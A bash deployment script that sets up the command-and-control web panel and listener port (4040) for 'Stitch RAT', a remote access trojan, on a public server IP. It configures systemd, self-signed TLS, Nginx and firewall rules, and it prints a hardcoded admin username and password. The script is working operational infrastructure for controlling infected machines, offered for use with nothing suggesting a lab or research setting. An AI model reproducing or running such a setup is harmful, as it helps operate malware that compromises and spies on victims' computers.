#!/bin/bash
# Complete deployment fix - handles SSL certificate generation properly

echo "🔧 Completing Stitch RAT deployment..."

# Create systemd service first
echo "Creating systemd service..."
cat > /etc/systemd/system/stitchrat.service << 'EOF'
[Unit]
Description=Stitch RAT Web Interface
After=network.target redis.service
Wants=redis.service

[Service]
Type=simple
User=stitchrat
Group=stitchrat
WorkingDirectory=/opt/stitchrat
Environment=PATH=/opt/stitchrat/venv/bin
EnvironmentFile=/opt/stitchrat/.env
ExecStart=/opt/stitchrat/venv/bin/python web_app_real.py
ExecReload=/bin/kill -HUP $MAINPID
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=stitchrat

NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/opt/stitchrat

LimitNOFILE=65536
LimitNPROC=4096

[Install]
WantedBy=multi-user.target
EOF

# Start services
echo "Starting Redis..."
systemctl enable redis-server
systemctl start redis-server

echo "Starting Stitch RAT application to generate SSL certificates..."
systemctl daemon-reload
systemctl enable stitchrat
systemctl start stitchrat

# Wait for SSL certificates to be generated
echo "Waiting for SSL certificates to be generated..."
for i in {1..30}; do
    if [ -f "/opt/stitchrat/certs/cert.pem" ] && [ -f "/opt/stitchrat/certs/key.pem" ]; then
        echo "✅ SSL certificates found!"
        break
    fi
    echo "Waiting for certificates... ($i/30)"
    sleep 2
done

# Check if certificates exist
if [ ! -f "/opt/stitchrat/certs/cert.pem" ]; then
    echo "⚠️ SSL certificates not found. Generating manually..."
    
    # Create certs directory
    mkdir -p /opt/stitchrat/certs
    chown stitchrat:stitchrat /opt/stitchrat/certs
    
    # Generate self-signed certificate
    openssl req -x509 -newkey rsa:4096 -keyout /opt/stitchrat/certs/key.pem -out /opt/stitchrat/certs/cert.pem -days 365 -nodes -subj "/C=US/ST=State/L=City/O=Organization/CN=50.21.187.77"
    
    # Set proper permissions
    chown stitchrat:stitchrat /opt/stitchrat/certs/*
    chmod 600 /opt/stitchrat/certs/key.pem
    chmod 644 /opt/stitchrat/certs/cert.pem
    
    echo "✅ SSL certificates generated manually!"
fi

# Now configure Nginx with proper SSL configuration
echo "Configuring Nginx..."
cat > /etc/nginx/sites-available/stitchrat << 'EOF'
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
limit_req_zone $binary_remote_addr zone=api:10m rate=30r/m;

server {
    listen 80;
    server_name 50.21.187.77 _;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name 50.21.187.77 _;
    
    ssl_certificate /opt/stitchrat/certs/cert.pem;
    ssl_certificate_key /opt/stitchrat/certs/key.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    add_header X-Frame-Options DENY always;
    add_header X-Content-Type-Options nosniff always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    server_tokens off;
    client_max_body_size 100M;
    
    location /login {
        limit_req zone=login burst=3 nodelay;
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
    
    location /api/ {
        limit_req zone=api burst=10 nodelay;
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
    
    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
        
        proxy_buffering on;
        proxy_buffer_size 4k;
        proxy_buffers 8 4k;
    }
    
    location /static/ {
        alias /opt/stitchrat/static/;
        expires 1y;
        add_header Cache-Control "public, immutable";
        gzip on;
        gzip_types text/css application/javascript image/svg+xml;
    }
    
    location /health {
        access_log off;
        proxy_pass http://127.0.0.1:5000;
    }
}
EOF

# Enable the site
ln -sf /etc/nginx/sites-available/stitchrat /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default

# Test nginx configuration
echo "Testing Nginx configuration..."
nginx -t

if [ $? -eq 0 ]; then
    echo "✅ Nginx configuration is valid!"
    
    # Start Nginx
    systemctl enable nginx
    systemctl start nginx
    
    echo "✅ Nginx started successfully!"
else
    echo "❌ Nginx configuration still has errors."
    exit 1
fi

# Configure firewall
echo "Configuring firewall..."
ufw --force enable
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp comment 'SSH'
ufw allow 80/tcp comment 'HTTP'
ufw allow 443/tcp comment 'HTTPS'
ufw allow 8443/tcp comment 'Plesk'
ufw allow 4040/tcp comment 'RAT Server'

# Create management scripts
echo "Creating management scripts..."
cat > /usr/local/bin/stitchrat-status << 'EOF'
#!/bin/bash
echo "=== Stitch RAT System Status ==="
echo ""
echo "🔹 Application Service:"
systemctl status stitchrat --no-pager -l | head -10
echo ""
echo "🔹 Nginx Service:"
systemctl status nginx --no-pager -l | head -10
echo ""
echo "🔹 Redis Service:"
systemctl status redis-server --no-pager -l | head -5
echo ""
echo "🔹 Firewall Status:"
ufw status numbered
echo ""
echo "🔹 SSL Certificates:"
if [ -f "/opt/stitchrat/certs/cert.pem" ]; then
    echo "✅ SSL Certificate exists"
    openssl x509 -in /opt/stitchrat/certs/cert.pem -noout -dates
else
    echo "❌ SSL Certificate missing"
fi
echo ""
echo "🔹 Recent Application Logs:"
journalctl -u stitchrat --no-pager -n 5
EOF

cat > /usr/local/bin/stitchrat-restart << 'EOF'
#!/bin/bash
echo "🔄 Restarting Stitch RAT services..."
systemctl restart stitchrat
echo "⏳ Waiting for application to start..."
sleep 5
systemctl restart nginx
echo "✅ Services restarted successfully!"
echo ""
echo "🔍 Quick status check:"
systemctl is-active stitchrat && echo "✅ Stitch RAT: Running" || echo "❌ Stitch RAT: Not running"
systemctl is-active nginx && echo "✅ Nginx: Running" || echo "❌ Nginx: Not running"
EOF

cat > /usr/local/bin/stitchrat-logs << 'EOF'
#!/bin/bash
echo "📝 Stitch RAT Live Logs (Press Ctrl+C to exit):"
echo "================================================"
journalctl -u stitchrat -f
EOF

chmod +x /usr/local/bin/stitchrat-status
chmod +x /usr/local/bin/stitchrat-restart
chmod +x /usr/local/bin/stitchrat-logs

echo ""
echo "🎉 =================================="
echo "🎉   DEPLOYMENT COMPLETED!          "
echo "🎉 =================================="
echo ""
echo "🌐 Web Interface: https://50.21.187.77"
echo "👤 Username: admin"
echo "🔑 Password: StitchRAT_SecurePass_2025!"
echo "🔌 RAT Server Port: 4040"
echo "⚙️ Plesk Panel: https://50.21.187.77:8443"
echo ""
echo "🛠️ Management Commands:"
echo "   stitchrat-status  - Check system status"
echo "   stitchrat-restart - Restart all services"
echo "   stitchrat-logs    - View live logs"
echo ""
echo "🔍 Final Status Check:"
echo "======================"

# Final status check
sleep 3
stitchrat-status

echo ""
echo "🎉 Your Stitch RAT is ready! Access it at: https://50.21.187.77"
echo "⚠️  Note: You may see a SSL warning in your browser (this is normal for self-signed certificates)"
echo "   Click 'Advanced' -> 'Proceed to 50.21.187.77' to access your application"